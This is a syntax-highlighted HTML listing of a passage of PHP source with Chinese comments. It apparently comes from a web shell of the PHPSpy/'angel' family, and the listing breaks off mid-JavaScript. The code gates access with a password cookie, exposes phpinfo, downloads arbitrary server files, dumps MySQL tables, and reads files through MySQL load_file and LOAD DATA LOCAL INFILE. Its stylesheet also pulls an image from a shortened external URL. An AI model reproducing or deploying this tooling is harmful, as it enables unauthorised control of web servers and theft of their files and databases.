<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">action</span> == <span style="color: #70c0b1;">'login'</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">pass</span> == <span style="color: #eaeaea; background-color: #000000;">encode_pass(</span>$<span style="color: #e7c547;">password</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">scookie(</span><span style="color: #70c0b1;">'loginpass'</span>,<span style="color: #eaeaea; background-color: #000000;">encode_pass(</span>$<span style="color: #e7c547;">password</span>));
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   @<span style="color: #eaeaea; background-color: #000000;">header(</span><span style="color: #70c0b1;">'Location: '</span>.$<span style="color: #e7c547;">self</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">exit</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #7aa6da;">_COOKIE</span>[<span style="color: #70c0b1;">'loginpass'</span>]) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #7aa6da;">_COOKIE</span>[<span style="color: #70c0b1;">'loginpass'</span>] != $<span style="color: #e7c547;">pass</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">loginpage(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">loginpage(</span>);
<span style="background-color: #424242;"> </span>   }
}
<span style="color: #969896; font-style: italic;">/*</span><span style="color: #969896; font-style: italic;">===================== &#39564;&#35777;&#32467;&#26463; =====================*/</span>

$<span style="color: #e7c547;">errmsg</span> = <span style="color: #70c0b1;">''</span>;
!$<span style="color: #e7c547;">action</span> &amp;&amp; $<span style="color: #e7c547;">action</span> = <span style="color: #70c0b1;">'file'</span>;

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#26597;&#30475;PHPINFO</span>
<span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">action</span> == <span style="color: #70c0b1;">'phpinfo'</span>) {
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (<span style="color: #d54e53; font-weight: bold;">IS_PHPINFO</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">phpinfo(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">exit</span>;
<span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">errmsg</span> = <span style="color: #70c0b1;">'phpinfo() function has non-permissible'</span>;
<span style="background-color: #424242;"> </span>   }
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#19979;&#36733;&#25991;&#20214;</span>
<span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">doing</span> == <span style="color: #70c0b1;">'downfile'</span> &amp;&amp; $<span style="color: #e7c547;">thefile</span>) {
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (!@<span style="color: #eaeaea; background-color: #000000;">file_exists(</span>$<span style="color: #e7c547;">thefile</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">errmsg</span> = <span style="color: #70c0b1;">'The file you want Downloadable was nonexistent'</span>;
<span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">fileinfo</span> = <span style="color: #eaeaea; background-color: #000000;">pathinfo(</span>$<span style="color: #e7c547;">thefile</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">header(</span><span style="color: #70c0b1;">'Content-type: application/x-'</span>.$<span style="color: #e7c547;">fileinfo</span>[<span style="color: #70c0b1;">'extension'</span>]);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">header(</span><span style="color: #70c0b1;">'Content-Disposition: attachment; filename='</span>.$<span style="color: #e7c547;">fileinfo</span>[<span style="color: #70c0b1;">'basename'</span><span style="text-decoration: underline;">]);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">header(</span><span style="color: #70c0b1;">'Content-Length: '</span>.<span style="color: #eaeaea; background-color: #000000;">filesize(</span>$<span style="color: #e7c547;">thefile</span>));
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   @<span style="color: #eaeaea; background-color: #000000;">readfile(</span>$<span style="color: #e7c547;">thefile</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">exit</span>;
<span style="background-color: #424242;"> </span>   }
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#30452;&#25509;&#19979;&#36733;&#22791;&#20221;&#25968;&#25454;&#24211;</span>
<span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">doing</span> == <span style="color: #70c0b1;">'backupmysql'</span> &amp;&amp; !$<span style="color: #e7c547;">saveasfile</span>) {
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (!$<span style="color: #e7c547;">table</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">errmsg</span> =<span style="color: #70c0b1;">'Please choose the table'</span>;
<span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">mysqllink</span> = <span style="color: #eaeaea; background-color: #000000;">mydbconn(</span>$<span style="color: #e7c547;">dbhost</span>, $<span style="color: #e7c547;">dbuser</span>, $<span style="color: #e7c547;">dbpass</span>, $<span style="color: #e7c547;">dbname</span>, $<span style="color: #e7c547;">charset</span>, $<span style="color: #e7c547;">dbp</span><span style="color: #e7c547; text-decoration: underline;">ort</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">filename</span> = <span style="color: #eaeaea; background-color: #000000;">basename(</span>$<span style="color: #e7c547;">dbname</span>.<span style="color: #70c0b1;">'.sql'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">header(</span><span style="color: #70c0b1;">'Content-type: application/unknown'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">header(</span><span style="color: #70c0b1;">'Content-Disposition: attachment; filename='</span>.$<span style="color: #e7c547;">filename</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">foreach</span>($<span style="color: #e7c547;">table</span> <span style="color: #b9ca4a;">as</span> $<span style="color: #e7c547;">k</span> =&gt; $<span style="color: #e7c547;">v</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">v</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">sqldumptable(</span>$<span style="color: #e7c547;">v</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">mysql_close(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">exit</span>;
<span style="background-color: #424242;"> </span>   }
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#36890;&#36807;MYSQL&#19979;&#36733;&#25991;&#20214;</span>
<span style="color: #b9ca4a;">if</span>($<span style="color: #e7c547;">doing</span>==<span style="color: #70c0b1;">'mysqldown'</span>){
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (!$<span style="color: #e7c547;">dbname</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">errmsg</span> = <span style="color: #70c0b1;">'Please input dbname'</span>;
<span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">mysqllink</span> = <span style="color: #eaeaea; background-color: #000000;">mydbconn(</span>$<span style="color: #e7c547;">dbhost</span>, $<span style="color: #e7c547;">dbuser</span>, $<span style="color: #e7c547;">dbpass</span>, $<span style="color: #e7c547;">dbname</span>, $<span style="color: #e7c547;">charset</span>, $<span style="color: #e7c547;">dbp</span><span style="color: #e7c547; text-decoration: underline;">ort</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (!<span style="color: #eaeaea; background-color: #000000;">file_exists(</span>$<span style="color: #e7c547;">mysqldlfile</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">errmsg</span> = <span style="color: #70c0b1;">'The file you want Downloadable was nonexistent'</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">result</span> = <span style="color: #eaeaea; background-color: #000000;">q(</span><span style="color: #70c0b1;">"select load_file('$mysqldlfile');"</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(!$<span style="color: #e7c547;">result</span>){
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">q(</span><span style="color: #70c0b1;">"DROP TABLE IF EXISTS tmp_angel;"</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">q(</span><span style="color: #70c0b1;">"CREATE TABLE tmp_angel (content LONGBLOB NOT NULL);"</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#29992;&#26102;&#38388;&#25139;&#26469;&#34920;&#31034;&#25130;&#26029;,&#36991;&#20813;&#20986;&#29616;&#35835;&#21462;&#33258;&#36523;&#25110;&#21253;&#21547;__angel_1111111111_eof__&#30340;&#25991;&#20214;&#26102;&#19981;&#23436;&#25972;&#30340;&#24773;&#20917;</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">q(</span><span style="color: #70c0b1;">"LOAD DATA LOCAL INFILE '"</span>.<span style="color: #eaeaea; background-color: #000000;">addslashes(</span>$<span style="color: #e7c547;">mysqldlfile</span>).<span style="color: #70c0b1;">"' INTO TA</span><span style="color: #70c0b1; text-decoration: underline;">BLE tmp_angel FIELDS TERMINATED BY '__angel_{$timestamp}_eof__' ESCAPED BY '' LINES TERMINATED BY '__angel_{$timestamp}_eof__';"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">result</span> = <span style="color: #eaeaea; background-color: #000000;">q(</span><span style="color: #70c0b1;">"select content from tmp_angel"</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">q(</span><span style="color: #70c0b1;">"DROP TABLE tmp_angel"</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">row</span> = @<span style="color: #eaeaea; background-color: #000000;">mysql_fetch_array(</span>$<span style="color: #e7c547;">result</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (!$<span style="color: #e7c547;">row</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">errmsg</span> = <span style="color: #70c0b1;">'Load file failed '</span>.<span style="color: #eaeaea; background-color: #000000;">mysql_error(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">fileinfo</span> = <span style="color: #eaeaea; background-color: #000000;">pathinfo(</span>$<span style="color: #e7c547;">mysqldlfile</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">header(</span><span style="color: #70c0b1;">'Content-type: application/x-'</span>.$<span style="color: #e7c547;">fileinfo</span>[<span style="color: #70c0b1;">'extension'</span>]);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">header(</span><span style="color: #70c0b1;">'Content-Disposition: attachment; filename='</span>.$<span style="color: #e7c547;">fileinfo</span>[<span style="color: #70c0b1;">'b</span><span style="color: #70c0b1; text-decoration: underline;">asename'</span><span style="text-decoration: underline;">]);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">header(</span><span style="color: #70c0b1;">"Accept-Length: "</span>.<span style="color: #eaeaea; background-color: #000000;">strlen(</span>$<span style="color: #e7c547;">row</span>[<span style="color: #eaeaea; background-color: #000000;">0</span>]));
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">echo</span> $<span style="color: #e7c547;">row</span>[<span style="color: #eaeaea; background-color: #000000;">0</span>];
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">exit</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   }
}

<span style="color: #c397d8;">?&gt;</span>
<span style="color: #7aa6da;">&lt;html&gt;</span>
<span style="color: #7aa6da;">&lt;head&gt;</span>
<span style="color: #7aa6da;">&lt;meta</span> <span style="color: #d54e53; font-weight: bold;">http</span>-<span style="color: #d54e53; font-weight: bold;">equiv</span>=<span style="color: #70c0b1;">"Content-Type"</span> <span style="color: #7aa6da;">content=</span><span style="color: #70c0b1;">"text/html; charset=gbk"</span><span style="color: #7aa6da;">&gt;</span>
<span style="color: #7aa6da;">&lt;title&gt;</span><span style="color: #c397d8;">&lt;?php</span> <span style="color: #b9ca4a;">echo</span> $<span style="color: #e7c547;">action</span>.<span style="color: #70c0b1;">' - '</span>.$<span style="color: #7aa6da;">_SERVER</span>[<span style="color: #70c0b1;">'HTTP_HOST'</span>];<span style="color: #c397d8;">?&gt;</span><span style="color: #7aa6da;">&lt;/title&gt;</span>
<span style="color: #7aa6da;">&lt;style</span> <span style="color: #7aa6da;">type=</span><span style="color: #70c0b1;">"text/css"</span><span style="color: #7aa6da;">&gt;</span>
<span style="color: #d54e53; font-weight: bold;">body</span>,<span style="color: #d54e53; font-weight: bold;">td</span>{<span style="color: #d54e53; font-weight: bold;">font</span>: <span style="color: #eaeaea; background-color: #000000;">12</span>px <span style="color: #d54e53; font-weight: bold;">Arial</span>,<span style="color: #d54e53; font-weight: bold;">Tahoma</span>;<span style="color: #d54e53; font-weight: bold;">line</span>-<span style="color: #d54e53; font-weight: bold;">height</span>: <span style="color: #eaeaea; background-color: #000000;">16</span>px;}
.<span style="color: #d54e53; font-weight: bold;">input</span>{<span style="color: #d54e53; font-weight: bold;">font</span>:<span style="color: #eaeaea; background-color: #000000;">12</span>px <span style="color: #d54e53; font-weight: bold;">Arial</span>,<span style="color: #d54e53; font-weight: bold;">Tahoma</span>;<span style="color: #d54e53; font-weight: bold;">background</span>:<span style="color: #969896; font-style: italic;">#fff;border: 1px solid #666;padding:2px</span><span style="color: #969896; font-style: italic; text-decoration: underline;">;height:22px;}</span>
.<span style="color: #d54e53; font-weight: bold;">area</span>{<span style="color: #d54e53; font-weight: bold;">font</span>:<span style="color: #eaeaea; background-color: #000000;">12</span>px <span style="color: #70c0b1;">'Courier New'</span>, <span style="color: #d54e53; font-weight: bold;">Monospace</span>;<span style="color: #d54e53; font-weight: bold;">background</span>:<span style="color: #969896; font-style: italic;">#fff;border: 1px solid #666;</span><span style="color: #969896; font-style: italic; text-decoration: underline;">padding:2px;}</span>
.<span style="color: #d54e53; font-weight: bold;">bt</span> {<span style="color: #d54e53; font-weight: bold;">border</span>-<span style="color: #d54e53; font-weight: bold;">color</span>:<span style="color: #969896; font-style: italic;">#b0b0b0;background:#3d3d3d url(http://t.cn/zRymOgc);color:#fff</span><span style="color: #969896; font-style: italic; text-decoration: underline;">fff;font:12px Arial,Tahoma;height:22px;}</span>
<span style="color: #d54e53; font-weight: bold;">a</span> {<span style="color: #d54e53; font-weight: bold;">color</span>: <span style="color: #969896; font-style: italic;">#00f;text-decoration:underline;}</span>
<span style="color: #d54e53; font-weight: bold;">a</span>:<span style="color: #d54e53; font-weight: bold;">hover</span>{<span style="color: #d54e53; font-weight: bold;">color</span>: <span style="color: #969896; font-style: italic;">#f00;text-decoration:none;}</span>
.<span style="color: #d54e53; font-weight: bold;">alt1</span> <span style="color: #d54e53; font-weight: bold;">td</span>{<span style="color: #d54e53; font-weight: bold;">border</span>-<span style="color: #d54e53; font-weight: bold;">top</span>:<span style="color: #eaeaea; background-color: #000000;">1</span>px <span style="color: #d54e53; font-weight: bold;">solid</span> <span style="color: #969896; font-style: italic;">#fff;border-bottom:1px solid #ddd;background:#f1f1</span><span style="color: #969896; font-style: italic; text-decoration: underline;">f1;padding:5px 15px 5px 5px;}</span>
.<span style="color: #d54e53; font-weight: bold;">alt2</span> <span style="color: #d54e53; font-weight: bold;">td</span>{<span style="color: #d54e53; font-weight: bold;">border</span>-<span style="color: #d54e53; font-weight: bold;">top</span>:<span style="color: #eaeaea; background-color: #000000;">1</span>px <span style="color: #d54e53; font-weight: bold;">solid</span> <span style="color: #969896; font-style: italic;">#fff;border-bottom:1px solid #ddd;background:#f9f9</span><span style="color: #969896; font-style: italic; text-decoration: underline;">f9;padding:5px 15px 5px 5px;}</span>
.<span style="color: #d54e53; font-weight: bold;">focus</span> <span style="color: #d54e53; font-weight: bold;">td</span>{<span style="color: #d54e53; font-weight: bold;">border</span>-<span style="color: #d54e53; font-weight: bold;">top</span>:<span style="color: #eaeaea; background-color: #000000;">1</span>px <span style="color: #d54e53; font-weight: bold;">solid</span> <span style="color: #969896; font-style: italic;">#fff;border-bottom:1px solid #ddd;background:#fff</span><span style="color: #969896; font-style: italic; text-decoration: underline;">faa;padding:5px 15px 5px 5px;}</span>
.<span style="color: #d54e53; font-weight: bold;">head</span> <span style="color: #d54e53; font-weight: bold;">td</span>{<span style="color: #d54e53; font-weight: bold;">border</span>-<span style="color: #d54e53; font-weight: bold;">top</span>:<span style="color: #eaeaea; background-color: #000000;">1</span>px <span style="color: #d54e53; font-weight: bold;">solid</span> <span style="color: #969896; font-style: italic;">#fff;border-bottom:1px solid #ddd;background:#e9e9</span><span style="color: #969896; font-style: italic; text-decoration: underline;">e9;padding:5px 15px 5px 5px;font-weight:bold;}</span>
.<span style="color: #d54e53; font-weight: bold;">head</span> <span style="color: #d54e53; font-weight: bold;">td</span> <span style="color: #d54e53; font-weight: bold;">span</span>{<span style="color: #d54e53; font-weight: bold;">font</span>-<span style="color: #d54e53; font-weight: bold;">weight</span>:<span style="color: #d54e53; font-weight: bold;">normal</span>;}
.<span style="color: #d54e53; font-weight: bold;">infolist</span> {<span style="color: #d54e53; font-weight: bold;">padding</span>:<span style="color: #eaeaea; background-color: #000000;">10</span>px;<span style="color: #d54e53; font-weight: bold;">margin</span>:<span style="color: #eaeaea; background-color: #000000;">10</span>px <span style="color: #eaeaea; background-color: #000000;">0</span> <span style="color: #eaeaea; background-color: #000000;">20</span>px <span style="color: #eaeaea; background-color: #000000;">0</span>;<span style="color: #d54e53; font-weight: bold;">background</span>:<span style="color: #969896; font-style: italic;">#F1F1F1;border:1px solid</span><span style="color: #969896; font-style: italic; text-decoration: underline;"> #ddd;}</span>
<span style="color: #d54e53; font-weight: bold;">form</span>{<span style="color: #d54e53; font-weight: bold;">margin</span>:<span style="color: #eaeaea; background-color: #000000;">0</span>;<span style="color: #d54e53; font-weight: bold;">padding</span>:<span style="color: #eaeaea; background-color: #000000;">0</span>;}
<span style="color: #d54e53; font-weight: bold;">h2</span>{<span style="color: #d54e53; font-weight: bold;">margin</span>:<span style="color: #eaeaea; background-color: #000000;">0</span>;<span style="color: #d54e53; font-weight: bold;">padding</span>:<span style="color: #eaeaea; background-color: #000000;">0</span>;<span style="color: #d54e53; font-weight: bold;">height</span>:<span style="color: #eaeaea; background-color: #000000;">24</span>px;<span style="color: #d54e53; font-weight: bold;">line</span>-<span style="color: #d54e53; font-weight: bold;">height</span>:<span style="color: #eaeaea; background-color: #000000;">24</span>px;<span style="color: #d54e53; font-weight: bold;">font</span>-<span style="color: #d54e53; font-weight: bold;">size</span>:<span style="color: #eaeaea; background-color: #000000;">14</span>px;<span style="color: #d54e53; font-weight: bold;">color</span>:<span style="color: #969896; font-style: italic;">#5B686F;</span><span style="color: #969896; font-style: italic; text-decoration: underline;">}</span>
<span style="color: #d54e53; font-weight: bold;">ul</span>.<span style="color: #d54e53; font-weight: bold;">info</span> <span style="color: #d54e53; font-weight: bold;">li</span>{<span style="color: #d54e53; font-weight: bold;">margin</span>:<span style="color: #eaeaea; background-color: #000000;">0</span>;<span style="color: #d54e53; font-weight: bold;">color</span>:<span style="color: #969896; font-style: italic;">#444;line-height:24px;height:24px;}</span>
<span style="color: #d54e53; font-weight: bold;">u</span>{<span style="color: #d54e53; font-weight: bold;">text</span>-<span style="color: #d54e53; font-weight: bold;">decoration</span>: <span style="color: #d54e53; font-weight: bold;">none</span>;<span style="color: #d54e53; font-weight: bold;">color</span>:<span style="color: #969896; font-style: italic;">#777;float:left;display:block;width:150px;margin-r</span><span style="color: #969896; font-style: italic; text-decoration: underline;">ight:10px;}</span>
.<span style="color: #d54e53; font-weight: bold;">drives</span>{<span style="color: #d54e53; font-weight: bold;">padding</span>:<span style="color: #eaeaea; background-color: #000000;">5</span>px;}
.<span style="color: #d54e53; font-weight: bold;">drives</span> <span style="color: #d54e53; font-weight: bold;">span</span> {<span style="color: #d54e53; font-weight: bold;">margin</span>:<span style="color: #d54e53; font-weight: bold;">auto</span> <span style="color: #eaeaea; background-color: #000000;">7</span>px;}
<span style="color: #7aa6da;">&lt;/style&gt;</span>
<span style="color: #7aa6da;">&lt;script</span> <span style="color: #7aa6da;">type=</span><span style="color: #70c0b1;">"text/javascript"</span><span style="color: #7aa6da;">&gt;</span>
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">CheckAll</span>(<span style="color: #d54e53; font-weight: bold;">form</span>) {
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">for</span>(<span style="color: #b9ca4a;">var</span> <span style="color: #d54e53; font-weight: bold;">i</span>=<span style="color: #eaeaea; background-color: #000000;">0</span>;<span style="color: #d54e53; font-weight: bold;">i</span><span style="color: #7aa6da;">&lt;form</span>.<span style="color: #d54e53; font-weight: bold;">elements</span>.<span style="color: #d54e53; font-weight: bold;">length</span>;<span style="color: #d54e53; font-weight: bold;">i</span>++) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">var</span> <span style="color: #d54e53; font-weight: bold;">e</span> = <span style="color: #d54e53; font-weight: bold;">form</span>.<span style="color: #eaeaea; background-color: #000000;">elements[</span><span style="color: #d54e53; font-weight: bold;">i</span>];
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (<span style="color: #d54e53; font-weight: bold;">e</span>.<span style="color: #d54e53; font-weight: bold;">name</span> != <span style="color: #70c0b1;">'chkall'</span>)
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #d54e53; font-weight: bold;">e</span>.<span style="color: #d54e53; font-weight: bold;">checked</span> = <span style="color: #d54e53; font-weight: bold;">form</span>.<span style="color: #d54e53; font-weight: bold;">chkall</span>.<span style="color: #d54e53; font-weight: bold;">checked</span>;
<span style="background-color: #424242;"> </span>   }
}
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">$</span>(<span style="color: #d54e53; font-weight: bold;">id</span>) {
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> <span style="color: #d54e53; font-weight: bold;">document</span>.<span style="color: #eaeaea; background-color: #000000;">getElementById(</span><span style="color: #d54e53; font-weight: bold;">id</span>);
}
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">createdir</span>(){
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">var</span> <span style="color: #d54e53; font-weight: bold;">newdirname</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #d54e53; font-weight: bold;">newdirname</span> = <span style="color: #eaeaea; background-color: #000000;">prompt(</span><span style="color: #70c0b1;">'Please input the directory name:'</span>, <span style="color: #70c0b1;">''</span>  );
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (!<span style="color: #d54e53; font-weight: bold;">newdirname</span>) <span style="color: #b9ca4a;">return</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'createdir'</span>).<span style="color: #d54e53; font-weight: bold;">newdirname</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #d54e53; font-weight: bold;">newdirname</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'createdir'</span>).<span style="color: #eaeaea; background-color: #000000;">submit(</span>);
}
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">fileperm</span>(<span style="color: #d54e53; font-weight: bold;">pfile</span>){
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">var</span> <span style="color: #d54e53; font-weight: bold;">newperm</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #d54e53; font-weight: bold;">newperm</span> = <span style="color: #eaeaea; background-color: #000000;">prompt(</span><span style="color: #70c0b1;">'Current file:'</span>+<span style="color: #d54e53; font-weight: bold;">pfile</span>+<span style="color: #70c0b1;">'\nPlease input new attribute:'</span>, <span style="color: #70c0b1;">''</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (!<span style="color: #d54e53; font-weight: bold;">newperm</span>) <span style="color: #b9ca4a;">return</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'fileperm'</span>).<span style="color: #d54e53; font-weight: bold;">newperm</span>.<span style="color: #d54e53; font-weight: bold;">value</span>=<span style="color: #d54e53; font-weight: bold;">newperm</span>;
